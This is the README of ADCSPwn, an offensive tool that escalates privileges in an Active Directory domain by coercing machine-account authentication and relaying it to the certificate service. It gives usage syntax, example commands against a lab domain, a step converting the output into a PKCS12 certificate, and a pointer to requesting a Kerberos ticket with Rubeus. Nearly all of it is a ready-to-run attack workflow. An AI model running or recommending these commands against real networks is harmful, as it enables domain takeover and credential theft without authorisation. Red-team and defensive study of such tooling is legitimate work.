# ADCSPwn

A tool to escalate privileges in an active directory network by coercing authenticate from machine accounts and relaying to the certificate service.

## Usage

Run `ADCSPwn` on your target network.

```
adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]

Required arguments:
adcs            -       This is the address of the AD CS server which authentication will be relayed to.

Optional arguments:
port            -       The port ADCSPwn will listen on.
remote          -       Remote machine to trigger authentication from.

Example usage:
adcspwn.exe --adcs cs.pwnlab.local
adcspwn.exe --adcs cs.pwnlab.local --port 9001
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
```

Convert the output into the PKCS12 certificate format using `bundle2pkcs12`

```
python3 bundle2pkcs12.py <output blob>
```

Request a TGT with the PKCS12 certificate using Rubeus.
